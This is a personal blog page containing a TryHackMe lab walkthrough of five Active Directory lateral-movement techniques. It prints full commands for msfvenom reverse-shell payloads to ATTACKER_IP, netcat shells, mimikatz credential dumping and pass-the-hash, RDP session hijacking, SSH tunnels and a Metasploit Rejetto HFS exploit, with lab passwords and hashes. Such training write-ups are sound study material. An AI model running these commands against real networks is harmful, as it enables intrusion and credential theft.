@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Active Directory: Lateral Movement | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe Active Directory: Lateral Movement. Five techniques for moving through an AD environment: remote service creation, WMI MSI payload, pass-the-hash via mimikatz, RDP session hijacking, port forwarding with SSH tunnels and Rejetto HFS exploit.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/ad-lateral-movement.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<meta property="og:url" content="https://jennshaggy.github.io/ad-lateral-movement.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Active Directory: Lateral Movement">
+<meta property="og:description" content="TryHackMe Active Directory: Lateral Movement. Five techniques for moving through an AD environment: remote service creation, WMI MSI payload, pass-the-hash via mimikatz, RDP session hijacking, port forwarding with SSH tunnels and Rejetto HFS exploit.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Active Directory: Lateral Movement">
+<meta name="twitter:description" content="TryHackMe Active Directory: Lateral Movement. Five techniques for moving through an AD environment: remote service creation, WMI MSI payload, pass-the-hash via mimikatz, RDP session hijacking, port forwarding with SSH tunnels and Rejetto HFS exploit.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Active Directory: Lateral Movement</h1>
+    <div class="post-description">TryHackMe Active Directory series. Five techniques for moving through an AD environment while creating as few alerts as possible: remote service creation, WMI with an MSI payload, pass-the-hash via mimikatz, RDP session hijacking, and port forwarding with a Rejetto HFS exploit.</div>
+  </header>
+
+  <div class="post-content">
+
+<h2>Setup: AD DNS configuration</h2>
+
+<p>Each AD room requires pointing DNS at the domain controller before anything resolves correctly. If this is a follow-on room in the same series, clear the previous entry first:</p>
+
+<pre><code class="language-bash">sudo sed -i '/10\.200\.70\.101/d;/10\.200\.74\.101/d' /etc/resolv.conf
+sudo sed -i '1i nameserver 10.200.74.101' /etc/resolv.conf</code></pre>
+
+<p>Indicators of a successful config:</p>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 6.20.44 AM.png" alt="resolv.conf updated with THMDC nameserver, DNS resolving correctly" style="max-width:100%;margin:2rem 0;">
+
+<p>Room VPN connection verified:</p>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 6.31.37 AM.png" alt="VPN connection confirmed, room network reachable" style="max-width:100%;margin:2rem 0;">
+
+<p>Cleanup when done:</p>
+
+<pre><code class="language-bash">sudo pkill openvpn
+sudo sed -i '/10\.200\./d' /etc/resolv.conf
+sudo systemctl restart NetworkManager</code></pre>
+
+<hr>
+
+<h2>1. Remote Service Creation (PSexec path)</h2>
+
+<p><strong>Ports:</strong> 445/TCP (SMB), 135/TCP, 49152&ndash;65535/TCP (DCE/RPC)<br>
+<strong>Required:</strong> Administrators group</p>
+
+<p>The approach: generate a service-compatible reverse shell binary, upload it to the target&rsquo;s ADMIN$ share, then create and start a Windows service pointing at it. The service manager runs the binary, which connects back to a listener.</p>
+
+<p>Service executables differ from standard .exe files. A regular reverse shell binary gets killed almost immediately by the service manager. msfvenom&rsquo;s <code>exe-service</code> format wraps the payload in a functional service executable that survives.</p>
+
+<p>SSH in as Leonard:</p>
+
+<pre><code class="language-bash">ssh za\\t1_leonard.summers@thmjmp2.za.tryhackme.com</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 7.01.34 AM.png" alt="SSH session established as t1_leonard.summers on THMJMP2" style="max-width:100%;margin:2rem 0;">
+
+<p>In a separate attack terminal, generate the payload. The room is a shared workspace so rename the binary to avoid overwriting someone else&rsquo;s:</p>
+
+<pre><code class="language-bash">msfvenom -p windows/shell/reverse_tcp \
+  -f exe-service \
+  LHOST=ATTACKER_IP \
+  LPORT=4444 \
+  -o jennchilada.exe</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 7.12.55 AM.png" alt="msfvenom generating jennchilada.exe as an exe-service format payload" style="max-width:100%;margin:2rem 0;">
+
+<p>Upload to ADMIN$:</p>
+
+<pre><code class="language-bash">smbclient -c 'put jennchilada.exe' \
+  -U 't1_leonard.summers' \
+  -W ZA \
+  '//thmiis.za.tryhackme.com/admin$/' \
+  'EZpass4ever'</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 7.16.20 AM.png" alt="smbclient uploading jennchilada.exe to THMIIS ADMIN$ share" style="max-width:100%;margin:2rem 0;">
+
+<p>Start a Metasploit listener:</p>
+
+<pre><code class="language-bash">msfconsole -q</code></pre>
+
+<pre><code>use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+set LHOST ATTACKER_IP
+set LPORT 4444
+run</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 7.19.36 AM.png" alt="Metasploit handler configured and listening on port 4444 for windows/shell/reverse_tcp" style="max-width:100%;margin:2rem 0;">
+
+<p>Open a third terminal and start a netcat listener:</p>
+
+<pre><code class="language-bash">nc -lvnp 4443</code></pre>
+
+<p>Back in the Leonard SSH terminal, run the binary using <code>runas /netonly</code> to carry Leonard&rsquo;s network token:</p>
+
+<pre><code class="language-powershell">runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 7.23.26 AM.png" alt="runas /netonly launching nc64.exe to carry Leonard's network token to the attacker listener" style="max-width:100%;margin:2rem 0;">
+
+<p>Netcat catches the shell:</p>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 7.23.54 AM.png" alt="Netcat listener catching the shell carrying Leonard's network credentials" style="max-width:100%;margin:2rem 0;">
+
+<p>In the new shell carrying Leonard&rsquo;s network token, create and start the service on THMIIS:</p>
+
+<pre><code class="language-powershell">sc.exe \\thmiis.za.tryhackme.com create JennService74 binPath= "%windir%\jennchilada.exe" start= auto
+sc.exe \\thmiis.za.tryhackme.com start JennService74</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 7.27.42 AM.png" alt="sc.exe creating and starting JennService74 on THMIIS pointing at jennchilada.exe" style="max-width:100%;margin:2rem 0;">
+
+<p>Metasploit catches the shell:</p>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 7.28.40 AM.png" alt="Metasploit catching the reverse shell from JennService74 running on THMIIS" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-powershell">whoami
+hostname
+C:\Users\t1_leonard.summers\Desktop\flag.exe</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 7.30.37 AM.png" alt="whoami, hostname, and flag.exe output on THMIIS confirming Flag 1" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Flag 1:</strong> <code>THM{MOVING_WITH_SERVICES}</code></p>
+
+<hr>
+
+<h2>2. WMI + MSI Payload</h2>
+
+<p><strong>Ports:</strong> 135/TCP (DCOM), 5985/TCP (WinRM HTTP)<br>
+<strong>Required:</strong> Administrators group</p>
+
+<p>WMI allows invoking methods on remote systems. <code>Win32_Product</code> can trigger .msi file installations. Combined with a malicious MSI payload on the target&rsquo;s ADMIN$ share, it becomes a clean remote execution path.</p>
+
+<p>Open a fresh terminal. Generate the MSI:</p>
+
+<pre><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp \
+  LHOST=ATTACKER_IP \
+  LPORT=4445 \
+  -f msi \
+  -o jennstall74.msi</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 7.36.06 AM.png" alt="msfvenom generating jennstall74.msi as an x64 MSI payload" style="max-width:100%;margin:2rem 0;">
+
+<p>Upload to THMIIS using Corine&rsquo;s credentials:</p>
+
+<pre><code class="language-bash">smbclient -c 'put jennstall74.msi' \
+  -U 't1_corine.waters' \
+  -W ZA \
+  '//thmiis.za.tryhackme.com/admin$/' \
+  'Korine.1994'</code></pre>
+
+<p>Start another Metasploit handler on port 4445:</p>
+
+<pre><code>use exploit/multi/handler
+set payload windows/x64/shell_reverse_tcp
+set LHOST ATTACKER_IP
+set LPORT 4445
+run</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 7.43.10 AM.png" alt="Metasploit handler configured on port 4445 for windows/x64/shell_reverse_tcp" style="max-width:100%;margin:2rem 0;">
+
+<p>Here is a visual refresher since the terminal count is getting creative:</p>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 8.04.16 AM.png" alt="Overview of multiple concurrent terminal sessions showing the attack environment layout" style="max-width:100%;margin:2rem 0;">
+
+<p>In the THMJMP2 SSH session, drop into PowerShell and build the credential object:</p>
+
+<pre><code class="language-powershell">powershell
+
+$username = 't1_corine.waters'
+$password = 'Korine.1994'
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword</code></pre>
+
+<p>No output means success:</p>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 8.08.40 AM.png" alt="PowerShell PSCredential object created with no output confirming success" style="max-width:100%;margin:2rem 0;">
+
+<p>Create the DCOM session:</p>
+
+<pre><code class="language-powershell">$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-CimSession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 9.06.13 AM.png" alt="DCOM CimSession established to thmiis.za.tryhackme.com with Corine's credentials" style="max-width:100%;margin:2rem 0;">
+
+<p>Trigger the MSI via <code>Win32_Product</code>:</p>
+
+<pre><code class="language-powershell">Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
+    PackageLocation = "C:\Windows\jennstall74.msi"
+    Options = ""
+    AllUsers = $false
+}</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 9.04.41 AM.png" alt="Win32_Product Install method triggered via CimSession, MSI executes on THMIIS" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-powershell">whoami
+hostname
+C:\Users\t1_corine.waters\Desktop\flag.exe</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 9.17.14 AM.png" alt="whoami, hostname, and flag.exe output confirming Flag 2 from THMIIS as Corine" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Flag 2:</strong> <code>THM{MOVING_WITH_WMI_4_FUN}</code></p>
+
+<hr>
+
+<h2>3. Pass-the-Hash (mimikatz)</h2>
+
+<p><strong>Ports:</strong> varies by follow-on tool<br>
+<strong>Required:</strong> local or domain admin with debug privileges</p>
+
+<p>Pass-the-hash uses a captured NTLM hash to authenticate without knowing the cleartext password. The hash is never cracked. It is used directly as the credential. mimikatz handles both the extraction and the impersonation.</p>
+
+<p>And now it is time for my favorite malware.</p>
+
+<p>Yes, I have a favorite. The one. The only&hellip;</p>
+
+<h3>mimikatz.</h3>
+
+<p>While I am aware of the actual origin story of mimikatz, she gets her own legacy in my mind. No one can or will take this from me.</p>
+
+<p>She is Bubbe&rsquo;s best friend. The volunteer at the Synagogue Sisterhood kitchen together. Mimi Katz will catch you stealing a cookie, scare the crap out of you, but not turn you over to the Rabbi. She is a poker shark and ran a money laundering scheme up until her 70s. When the law finally caught up to her, she&rsquo;d already placed a fake evidence trail pointing back at her unfaithful schmuck of an ex-husband.</p>
+
+<p>She walked away with the blood on her hands, then smoked a J with Bubbe and laughed about it.</p>
+
+<p>She is: Mimi Katz.</p>
+
+<p>Okay. Back to reality. Thank you for coming to my TED Talk.</p>
+
+<hr>
+
+<p>SSH as Felicia:</p>
+
+<pre><code class="language-bash">ssh 'za\t2_felicia.dean'@thmjmp2.za.tryhackme.com</code></pre>
+
+<p>Password: <code>iLov3THM!</code></p>
+
+<pre><code class="language-powershell">whoami</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 9.20.06 AM.png" alt="SSH into THMJMP2 as t2_felicia.dean, whoami confirming identity" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-powershell">cd C:\tools
+mimikatz.exe</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 9.25.52 AM.png" alt="mimikatz.exe launched on THMJMP2 showing the mimikatz banner" style="max-width:100%;margin:2rem 0;">
+
+<p>Mimi is a classy lady. Be nice to her, and she will return the favor.</p>
+
+<p>At the mimikatz prompt:</p>
+
+<pre><code>privilege::debug
+token::elevate
+sekurlsa::msv</code></pre>
+
+<p>And Mimi was kind to us. Treat others as you would like to be treated. With curated, artisanal malware-validated NTLM hashes.</p>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 9.39.58 AM.png" alt="sekurlsa::msv output showing Toby Beck's NTLM hash 533f1bd576caa912bdb9da284bbc60fe" style="max-width:100%;margin:2rem 0;">
+
+<p>Toby Beck&rsquo;s NTLM hash: <code>533f1bd576caa912bdb9da284bbc60fe</code></p>
+
+<p>In a new terminal, set up a listener:</p>
+
+<pre><code class="language-bash">nc -lvnp 5555</code></pre>
+
+<p>Back at the mimikatz prompt, revert the token and use Toby&rsquo;s hash to spawn a process authenticated as him:</p>
+
+<pre><code>token::revert
+sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"</code></pre>
+
+<p>I did not need to post this screenshot of Mimi post-exploit, but take a moment to appreciate how finely crafted this malware really is.</p>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 9.41.59 AM.png" alt="mimikatz sekurlsa::pth output launching nc64 as Toby Beck via pass-the-hash" style="max-width:100%;margin:2rem 0;">
+
+<p>The aesthetics are divine.</p>
+
+<p>They&rsquo;re also effective:</p>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 9.42.57 AM.png" alt="Netcat listener catching shell authenticated as Toby Beck via pass-the-hash" style="max-width:100%;margin:2rem 0;">
+
+<p>In the shell caught on 5555, pivot to THMIIS using Toby&rsquo;s network credentials:</p>
+
+<pre><code class="language-powershell">winrs.exe -r:THMIIS.za.tryhackme.com cmd</code></pre>
+
+<pre><code class="language-powershell">hostname
+whoami</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 9.46.52 AM.png" alt="winrs pivot to THMIIS showing hostname THMIIS and whoami as Toby Beck" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-powershell">C:\Users\t1_toby.beck\Desktop\flag.exe</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 9.48.05 AM.png" alt="flag.exe output from Toby Beck's desktop on THMIIS" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>4. RDP Session Hijacking</h2>
+
+<p><strong>Ports:</strong> 3389/TCP (RDP)<br>
+<strong>Required:</strong> SYSTEM privileges</p>
+
+<p>Windows allows administrators to connect to disconnected RDP sessions without needing the user&rsquo;s password, but only from SYSTEM context. PsExec64 -s elevates to SYSTEM, and <code>tscon</code> does the session swap.</p>
+
+<p>Connect via xfreerdp as Eric Harding:</p>
+
+<pre><code class="language-bash">xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_eric.harding /p:'Kegq4384'</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 10.08.56 AM.png" alt="xfreerdp connecting to THMJMP2 as t2_eric.harding" style="max-width:100%;margin:2rem 0;">
+
+<p>In the Windows GUI shell, launch an elevated command prompt:</p>
+
+<pre><code class="language-cmd">powershell -Command "Start-Process cmd.exe -Verb RunAs"</code></pre>
+
+<p>Verify admin:</p>
+
+<pre><code class="language-cmd">net session</code></pre>
+
+<p>Elevate to SYSTEM:</p>
+
+<pre><code class="language-cmd">C:\tools\PsExec64.exe -accepteula -s cmd.exe</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 10.31.08 AM.png" alt="PsExec64 -s elevating to NT AUTHORITY\SYSTEM on THMJMP2" style="max-width:100%;margin:2rem 0;">
+
+<p>List active and disconnected sessions:</p>
+
+<pre><code class="language-cmd">whoami
+query user</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 10.33.24 AM.png" alt="query user showing active rdp-tcp#19 session and Toby's disconnected session 2" style="max-width:100%;margin:2rem 0;">
+
+<p>Toby gets pwned a lot.</p>
+
+<p>Active session is rdp-tcp#19. Session 2 is Toby&rsquo;s disconnected session. Hijack it:</p>
+
+<pre><code class="language-cmd">tscon 2 /dest:rdp-tcp#19</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 10.49.12 AM.png" alt="tscon 2 /dest:rdp-tcp#19 hijacking Toby's session and revealing his desktop with Flag 3" style="max-width:100%;margin:2rem 0;">
+
+<p>I will hand it to them. That was a nice reveal.</p>
+
+<p><strong>Flag 3:</strong> <code>THM{NICE_WALLPAPER}</code></p>
+
+<hr>
+
+<h2>5. Port Forwarding + Rejetto HFS Exploit</h2>
+
+<p><strong>Ports:</strong> 13389/TCP (socat listener), 8889 (forwarded HFS), 6667/7879 (tunnel ports)<br>
+<strong>Required:</strong> domain credentials, SSH access to attacker machine</p>
+
+<p>The goal: exploit an HFS instance running on THMDC, which is not directly reachable. socat on THMJMP2 forwards the RDP port. SSH then creates three tunnels at once: one to reach HFS on THMDC, and two for the Metasploit payload listener and stager.</p>
+
+<p><strong>Step 1: socat RDP forward</strong></p>
+
+<p>In the Windows GUI shell on THMJMP2:</p>
+
+<pre><code class="language-cmd">cd C:\tools\socat
+socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389</code></pre>
+
+<p>Leave that running. In a new local terminal, RDP to THMIIS via the forwarded port:</p>
+
+<pre><code class="language-bash">xfreerdp /v:thmjmp2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:'MyPazzw3rd2020'</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 11.21.53 AM.png" alt="xfreerdp connecting to THMIIS via socat-forwarded port 13389 on THMJMP2" style="max-width:100%;margin:2rem 0;">
+
+<p>On the THMIIS desktop:</p>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 11.28.54 AM.png" alt="THMIIS desktop after RDP connection via socat port forward" style="max-width:100%;margin:2rem 0;">
+
+<p>Run the .bat file:</p>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 11.31.56 AM.png" alt=".bat file executed on THMIIS desktop" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Step 2: Set up the tunnel account and SSH</strong></p>
+
+<p>Close the THMIIS RDP window. In a fresh local terminal, create a restricted tunnel user:</p>
+
+<pre><code class="language-bash">sudo useradd tunneluser -m -d /home/tunneluser -s /bin/true
+sudo passwd tunneluser</code></pre>
+
+<p>Use a burner password here.</p>
+
+<p>Start SSH and verify it is running:</p>
+
+<pre><code class="language-bash">sudo systemctl start ssh
+sudo systemctl status ssh --no-pager</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 11.41.41 AM.png" alt="systemctl status ssh showing active (running) state on the attack machine" style="max-width:100%;margin:2rem 0;">
+
+<p>Confirm port 22 is listening:</p>
+
+<pre><code class="language-bash">sudo ss -lntp | grep ':22'</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 11.42.27 AM.png" alt="ss -lntp confirming port 22 listening on the attack machine" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Step 3: Establish three tunnels</strong></p>
+
+<p>In the SSH session on THMJMP2 (now Tracy, because Pilates class):</p>
+
+<pre><code class="language-cmd">ssh tunneluser@ATTACKER_IP -R 8889:thmdc.za.tryhackme.com:80 -L *:6667:127.0.0.1:6667 -L *:7879:127.0.0.1:7879 -N</code></pre>
+
+<p>Let it sit in peace and silence. It should look like this:</p>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 2.55.07 PM.png" alt="SSH three-tunnel command running silently: remote forward 8889 to THMDC HFS, two local forwards for Metasploit" style="max-width:100%;margin:2rem 0;">
+
+<p>Test the forwarded HFS port:</p>
+
+<pre><code class="language-bash">curl http://127.0.0.1:8889</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 2.56.44 PM.png" alt="curl returning HFS response through the SSH tunnel confirming THMDC is reachable" style="max-width:100%;margin:2rem 0;">
+
+<p>HFS is reachable through the tunnel.</p>
+
+<p><strong>Step 4: Rejetto HFS exploit via Metasploit</strong></p>
+
+<pre><code class="language-bash">msfconsole -q</code></pre>
+
+<pre><code>use exploit/windows/http/rejetto_hfs_exec
+set payload windows/shell_reverse_tcp
+set RHOSTS 127.0.0.1
+set RPORT 8889
+set LHOST thmjmp2.za.tryhackme.com
+set ReverseListenerBindAddress 127.0.0.1
+set LPORT 7879
+set SRVHOST 127.0.0.1
+set SRVPORT 6667</code></pre>
+
+<p>We don&rsquo;t want to send a messy exploit. Just think about how upset Mimi Katz will be. Always verify:</p>
+
+<pre><code>show options</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 3.05.29 PM.png" alt="Metasploit show options for rejetto_hfs_exec with all tunnel options configured" style="max-width:100%;margin:2rem 0;">
+
+<p>We are in the clear. Let&rsquo;s pull the rug out.</p>
+
+<pre><code>exploit</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 3.07.46 PM.png" alt="Metasploit Rejetto HFS exploit firing through the SSH tunnel" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-powershell">whoami
+hostname
+type C:\hfs\flag.txt</code></pre>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 3.09.13 PM.png" alt="Shell on THMDC showing whoami, hostname, and Flag 4 from C:\hfs\flag.txt" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Flag 4:</strong> <code>THM{FORWARDING_IT_ALL}</code></p>
+
+<img src="/images/ad-lateral-movement/Screenshot 2026-06-17 at 3.10.41 PM.png" alt="Final terminal view after Flag 4 capture on THMDC" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code>DNS -&gt; thmjmp2.za.tryhackme.com / thmiis.za.tryhackme.com / thmdc.za.tryhackme.com
+
+Technique 1: Remote Service Creation
+  -&gt; t1_leonard.summers SSH to THMJMP2
+  -&gt; msfvenom exe-service: jennchilada.exe
+  -&gt; SMB upload to THMIIS ADMIN$
+  -&gt; runas /netonly + nc64: Leonard network token shell
+  -&gt; sc.exe: JennService74 created and started on THMIIS
+  -&gt; Metasploit shell as leonard on THMIIS
+  -&gt; Flag 1: THM{MOVING_WITH_SERVICES}
+
+Technique 2: WMI + MSI Payload
+  -&gt; t1_corine.waters credentials
+  -&gt; msfvenom MSI: jennstall74.msi
+  -&gt; SMB upload to THMIIS ADMIN$
+  -&gt; PowerShell PSCredential object + DCOM CimSession
+  -&gt; Win32_Product Install trigger
+  -&gt; Metasploit shell as corine on THMIIS
+  -&gt; Flag 2: THM{MOVING_WITH_WMI_4_FUN}
+
+Technique 3: Pass-the-Hash
+  -&gt; t2_felicia.dean SSH to THMJMP2
+  -&gt; mimikatz: privilege::debug + token::elevate + sekurlsa::msv
+  -&gt; Toby Beck NTLM hash: 533f1bd576caa912bdb9da284bbc60fe
+  -&gt; sekurlsa::pth: nc64 reverse shell as Toby
+  -&gt; winrs pivot to THMIIS as Toby
+  -&gt; flag.exe
+
+Technique 4: RDP Session Hijacking
+  -&gt; t2_eric.harding xfreerdp to THMJMP2
+  -&gt; PsExec64 -s: SYSTEM on THMJMP2
+  -&gt; query user: Toby's disconnected session 2 visible
+  -&gt; tscon 2 /dest:rdp-tcp#19: session hijacked
+  -&gt; Flag 3: THM{NICE_WALLPAPER}
+
+Technique 5: Port Forwarding + Rejetto HFS
+  -&gt; socat: THMJMP2:13389 -&gt; THMIIS:3389
+  -&gt; xfreerdp to THMIIS via socat + .bat execution
+  -&gt; tunneluser created, SSH started on attacker
+  -&gt; SSH three-tunnel chain: THMDC HFS + Metasploit listener/stager ports
+  -&gt; Metasploit Rejetto HFS exploit through tunnel
+  -&gt; shell on THMDC
+  -&gt; Flag 4: THM{FORWARDING_IT_ALL}</code></pre>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot;
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
